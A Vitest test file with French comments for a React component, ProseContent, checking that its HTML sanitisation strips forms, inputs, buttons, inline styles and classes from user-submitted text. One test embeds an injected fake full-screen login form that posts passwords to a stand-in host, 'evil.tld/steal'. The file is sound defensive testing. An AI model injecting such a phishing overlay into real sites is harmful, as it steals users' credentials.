// @vitest-environment jsdom
import { describe, it, expect } from "vitest";
import { render } from "@testing-library/react";
import { ProseContent } from "./ProseContent";

/**
 * `ProseContent` rend du texte saisi par N'IMPORTE QUEL utilisateur (description
 * d'un commun, réponse coform) via `dangerouslySetInnerHTML`. Les cas XSS
 * « classiques » (script, handler, javascript:) vivent dans
 * `modules/coform/components/FormFields.test.tsx` ; ici, ce que ces cas ne
 * voient pas.
 */
describe("ProseContent — profil de sanitisation restreint (H23)", () => {
  it("ne rend jamais un faux écran de connexion : ni form/input/button, ni style, ni class", () => {
    // Aucun script : le profil DOMPurify PAR DÉFAUT laissait passer ce payload
    // tel quel, et la route `/aac/commun/:answerId` est publique.
    const { container } = render(
      <ProseContent
        text={
          '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:99999" class="fixed inset-0">' +
          '<form action="https://evil.tld/steal"><input type="password" name="pwd"><button>Se connecter</button></form></div>'
        }
      />,
    );
    expect(container.querySelector("form")).toBeNull();
    expect(container.querySelector("input")).toBeNull();
    expect(container.querySelector("button")).toBeNull();
    expect(container.querySelector("[style]")).toBeNull();
    expect(container.querySelector("div div")?.getAttribute("class")).toBeNull();
    // Le texte, lui, reste lisible.
    expect(container.textContent).toContain("Se connecter");
  });

  it("applique le même profil à la branche markdown (HTML inline dans du markdown)", () => {
    const { container } = render(
      <ProseContent text={'**ok** <span style="position:fixed" class="fixed">x</span>'} forceMarkdown />,
    );
    expect(container.querySelector("strong")?.textContent).toBe("ok");
    const span = container.querySelector("span");
    expect(span).not.toBeNull();
    expect(span?.getAttribute("style")).toBeNull();
    expect(span?.getAttribute("class")).toBeNull();
  });

  it("le `className` de l'appelant reste le seul habillage", () => {
    const { container } = render(<ProseContent text={"Texte"} className="prose prose-sm" />);
    expect(container.firstElementChild?.className).toBe("prose prose-sm");
  });
});
